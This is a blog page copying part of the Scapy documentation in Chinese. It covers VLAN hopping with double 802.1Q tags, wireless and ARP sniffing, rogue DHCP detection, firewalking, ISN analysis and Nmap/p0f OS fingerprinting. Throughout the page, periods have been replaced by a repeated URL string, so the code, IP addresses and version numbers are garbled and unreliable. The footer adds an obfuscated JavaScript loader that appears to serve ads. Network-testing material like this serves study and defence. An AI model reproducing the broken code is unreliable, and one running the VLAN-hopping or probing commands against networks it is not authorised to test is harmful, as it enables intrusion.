&lt;IP src=172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/232 proto=1 [https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/] |&lt;ICMP code=0 type=0 [https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/]|
&lt;Padding load=’0O\x02\x01\x00\x04\x06public\xa2B\x02\x02\x1e’ |&gt;&gt;&gt;</code></pre> 
<p>这是一个Linux2https://wizardforcel.gitbooks.io/scapy-docs/content/0的一个bug：</p> 
<pre><code>&gt;&gt;&gt; sr1(IP(dst="172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1", options="\x02")/ICMP())
&lt;IP src=172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 [https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/] |&lt;ICMP code=0 type=12 [https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/] |
&lt;IPerror src=172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/24 options=’\x02\x00\x00\x00’ [https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/] |
&lt;ICMPerror code=0 type=8 id=0x0 seq=0x0 chksum=0xf7ff |
&lt;Padding load=’\x00[https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/]\x00\x1dhttps://wizardforcel.gitbooks.io/scapy-docs/content/\x00V\x1f\xaf\xd9\xd4;\xca’ |&gt;&gt;&gt;&gt;&gt;</code></pre> 
<p>在非常特殊的情况下，使用double 802https://wizardforcel.gitbooks.io/scapy-docs/content/1q封装，可以将一个数据包跳到另一个VLAN中：</p> 
<pre><code class="language-html"> </code></pre> 
<pre><code>&gt;&gt;&gt; sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())</code></pre> 
<p>以下的命令将会像大多数的无线嗅探器那样显示信息：</p> 
<pre><code>&gt;&gt;&gt; sniff(iface="ath0",prn=lambda x:xhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("{Dot11Beacon:%Dot11https://wizardforcel.gitbooks.io/scapy-docs/content/addr3%\t%Dot11Beaconhttps://wizardforcel.gitbooks.io/scapy-docs/content/info%\t%PrismHeaderhttps://wizardforcel.gitbooks.io/scapy-docs/content/channel%\tDot11Beaconhttps://wizardforcel.gitbooks.io/scapy-docs/content/cap%}"))</code></pre> 
<p>以上命令会产生类似如下的输出：</p> 
<pre><code>00:00:00:01:02:03 netgear 6L ESS+privacy+PBCC
11:22:33:44:55:66 wireless_100 6L short-slot+ESS+privacy
44:55:66:00:11:22 linksys 6L short-slot+ESS+privacy
12:34:56:78:90:12 NETGEAR 6L short-slot+ESS+privacy+short-preamble</code></pre> 
<p>以下的程序使用了<code>sniff()</code>函数的回调功能（prn参数）。将store参数设置为0，就可以使<code>sniff()</code>函数不存储任何数据（否则会存储），所以就可以一直嗅探下去。filter参数 则用于在高负荷的情况下有更好的性能：filter会在内核中应用，而且Scapy就只能嗅探到ARP流量。</p> 
<pre><code>#! /usr/bin/env python
from scapyhttps://wizardforcel.gitbooks.io/scapy-docs/content/all import *

def arp_monitor_callback(pkt):
if ARP in pkt and pkt[ARP]https://wizardforcel.gitbooks.io/scapy-docs/content/op in (1,2): #who-has or is-at
return pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%ARPhttps://wizardforcel.gitbooks.io/scapy-docs/content/hwsrc% %ARPhttps://wizardforcel.gitbooks.io/scapy-docs/content/psrc%")

sniff(prn=arp_monitor_callback, filter="arp", store=0)</code></pre> 
<h4 id="articleHeader8">Problem</h4> 
<p>你怀疑有人已经在你的LAN中安装了额外的未经授权的DHCP服务器-无论是故意的还是有意的。因此你想要检查是否有任何活动的DHCP服务器，并确定他们的IP和MAC地址。</p> 
<h4 id="articleHeader9">Solution</h4> 
<p>使用Scapy发送一个DHCP发现请求，并分析应答：</p> 
<pre><code>&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/checkIPaddr = False
&gt;&gt;&gt; fam,hw = get_if_raw_hwaddr(confhttps://wizardforcel.gitbooks.io/scapy-docs/content/iface)
&gt;&gt;&gt; dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0",dst="255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
&gt;&gt;&gt; ans, unans = srp(dhcp_discover, multi=True) # Press CTRL-C after several seconds
Begin emission:
Finished to send 1 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Received 8 packets, got 2 answers, remaining 0 packets</code></pre> 
<p>在这种情况下，我们得到了两个应答，所以测试网络上有两个活动的DHCP服务器：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summarize()
Ether / IP / UDP 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0:bootpc &gt; 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:bootps &gt; 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255:bootpc / BOOTP / DHCP
Ether / IP / UDP 0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0:bootpc &gt; 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/11:bootps &gt; 255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255:bootpc / BOOTP / DHCP
}}}
We are only interested in the MAC and IP addresses of the replies:
{<!-- -->{<!-- -->{
&gt;&gt;&gt; for p in ans: print p[1][Ether]https://wizardforcel.gitbooks.io/scapy-docs/content/src, p[1][IP]https://wizardforcel.gitbooks.io/scapy-docs/content/src
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
00:de:ad:be:ef:00 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1
00:11:11:22:22:33 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/11</code></pre> 
<h4 id="articleHeader10">Discussion</h4> 
<p>我们设置<code>multi=True</code>来确保Scapy在接收到第一个响应之后可以等待更多的应答数据包。这也就是我们为什么不用更方便的<code>dhcp_request()</code>函数，而是手动地构造DCHP数据包的原因：<code>dhcp_request()</code>使用<code>srp1()</code>来发送和接收数据包，这样在接收到一个应答数据包之后就会立即返回。</p> 
<p>此外，Scapy通常确保应答来源于之前发送请求的目的地址。但是我们的DHCP数据包被发送到IP广播地址（255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255https://wizardforcel.gitbooks.io/scapy-docs/content/255），任何应答数据包都将回复DCHP服务器的IP地址作为其源IP地址（ehttps://wizardforcel.gitbooks.io/scapy-docs/content/ghttps://wizardforcel.gitbooks.io/scapy-docs/content/ 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1）。由于这些IP地址不匹配，我们必须在发送请求前使用<code>confhttps://wizardforcel.gitbooks.io/scapy-docs/content/checkIPaddr = False</code>来禁用Scapy的check。</p> 
<h4 id="articleHeader11">See also</h4> 
<p> </p> 
<p>TTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL超时</p> 
<pre><code>&gt;&gt;&gt; ans, unans = sr(IP(dst="172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/27", ttl=16)/TCP(dport=(1,1024)))
&gt;&gt;&gt; for s,r in ans:
if rhttps://wizardforcel.gitbooks.io/scapy-docs/content/haslayer(ICMP) and rhttps://wizardforcel.gitbooks.io/scapy-docs/content/payloadhttps://wizardforcel.gitbooks.io/scapy-docs/content/type == 11:
print shttps://wizardforcel.gitbooks.io/scapy-docs/content/dport</code></pre> 
<p>在对多网卡的防火墙查找子网时，只有它自己的网卡IP可以达到这个TTL：</p> 
<pre><code>&gt;&gt;&gt; ans, unans = sr(IP(dst="172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/5/24", ttl=15)/TCP())
&gt;&gt;&gt; for i in unans: print ihttps://wizardforcel.gitbooks.io/scapy-docs/content/dst</code></pre> 
<h4 id="articleHeader12">Problem</h4> 
<p>在比较流行的端口扫描器中，一种常见的情况就是没有设置TCP时间戳选项，而许多防火墙都包含一条规则来丢弃这样的TCP数据包。</p> 
<h4 id="articleHeader13">Solution</h4> 
<p>为了让Scapy能够到达其他位置，就必须使用其他选项：</p> 
<pre><code>&gt;&gt;&gt; sr1(IP(dst="72https://wizardforcel.gitbooks.io/scapy-docs/content/14https://wizardforcel.gitbooks.io/scapy-docs/content/207https://wizardforcel.gitbooks.io/scapy-docs/content/99")/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))]))</code></pre> 
<h4 id="articleHeader14">Problem</h4> 
<p>你已经使用Scapy收集或者嗅探了一些数据包，因为Wireshark高级的数据包展示功能，你想使用Wireshark查看这些数据包。</p> 
<p>正好可以使用<code>wireshark()</code>函数：</p> 
<pre><code>&gt;&gt;&gt; packets = Ether()/IP(dst=Net("googlehttps://wizardforcel.gitbooks.io/scapy-docs/content/com/30"))/ICMP() # first generate some packets
&gt;&gt;&gt; wireshark(packets) # show them with Wireshark</code></pre> 
<h4 id="articleHeader15">Discussion</h4> 
<p><code>wireshark()</code>函数可以生成一个临时pcap文件，来包含你的数据包，然后会在后台启动Wireshark，使其在启动时读取该文件。</p> 
<p>请记住Wireshark是处理第二层的数据包（通常被称为“帧”）。所以我们必须为ICMP数据包添加一个Ether()头。如果你直接将IP数据包（第三层）传递给Wireshark，你将会得到一个奇怪的结果。</p> 
<p>你可以通过改变confhttps://wizardforcel.gitbooks.io/scapy-docs/content/proghttps://wizardforcel.gitbooks.io/scapy-docs/content/wireshark的配置设置，来告诉Scapy去哪寻找Wireshark可执行文件。</p> 
<h4 id="articleHeader16">ISN</h4> 
<p>Scapy的可用于分析ISN（初始序列号）递增来发现可能有漏洞的系统。首先我们将在一个循环中发送SYN探头，来收集目标响应：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=srloop(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1")/TCP(dport=80,flags="S"))</code></pre> 
<p>一旦我们得到响应之后，我们可以像这样开始分析收集到的数据：</p> 
<pre><code>&gt;&gt;&gt; temp = 0
&gt;&gt;&gt; for s,r in ans:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ temp = r[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/seq - temp
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ print str(r[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/seq) + "\t+" + str(temp)
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
4278709328 +4275758673
4279655607 +3896934
4280642461 +4276745527
4281648240 +4902713
4282645099 +4277742386
4283643696 +5901310</code></pre> 
<h4 id="articleHeader17">nmap_fp</h4> 
<p>在Scapy中支持Nmap指纹识别（是到Nmap v4https://wizardforcel.gitbooks.io/scapy-docs/content/20的“第一代”功能）。在Scapy v2中，你首先得加载扩展模块：</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li><code>&gt;&gt;&gt; load_module("nmap")</code></li></ol> 
<p>如果你已经安装了Nmap，你可以让Scapy使用它的主动操作系统指纹数据库。清确保version 1签名数据库位于指定的路径：</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li><code>&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/nmap_base</code></li></ol> 
<p>然后你可以使用<code>namp_fp()</code>函数，该函数和Nmap操作系统检测引擎使用同样的探针：</p> 
<pre><code>&gt;&gt;&gt; nmap_fp("192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1",oport=443,cport=1)
Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/****https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/**Finished to send 8 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Received 58 packets, got 7 answers, remaining 1 packets
(1https://wizardforcel.gitbooks.io/scapy-docs/content/0, ['Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/0 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/20', 'Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/19 w/grsecurity patch',
'Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/20 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/22 w/grsecurityhttps://wizardforcel.gitbooks.io/scapy-docs/content/org patch', 'Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/22-ck2 (x86)
w/grsecurityhttps://wizardforcel.gitbooks.io/scapy-docs/content/org and HZ=1000 patches', 'Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/7 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/6https://wizardforcel.gitbooks.io/scapy-docs/content/11'])</code></pre> 
<h4 id="articleHeader18">p0f</h4> 
<p>如果你已在操作系统中安装了p0f，你可以直接从Scapy中使用它来猜测操作系统名称和版本。（仅在SYN数据库被使用时）。首先要确保p0f数据库存在于指定的路径：</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li><code>&gt;&gt;&gt; confhttps://wizardforcel.gitbooks.io/scapy-docs/content/p0f_base</code></li></ol> 
<p>例如，根据一个捕获的数据包猜测操作系统：</p> 
<pre><code>&gt;&gt;&gt; sniff(prn=prnp0f)
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:54716 - Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/6 (newer, 1) (up: 24 hrs)
-&gt; 74https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/19https://wizardforcel.gitbooks.io/scapy-docs/content/104:www (distance 0)
&lt;Sniffed: TCP:339 UDP:2 ICMP:0 Other:156&gt;</code></pre> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b31124c4ede0ee0d8b2e3f07f3f9de9e/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">html5文字横向变纵向,使用writing-mode让文字竖向排版</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/1027211fb92c98e5ab41a60334e92da2/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Web在线聊天室(完结) --- 注册用户&#43;ip地址</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}retur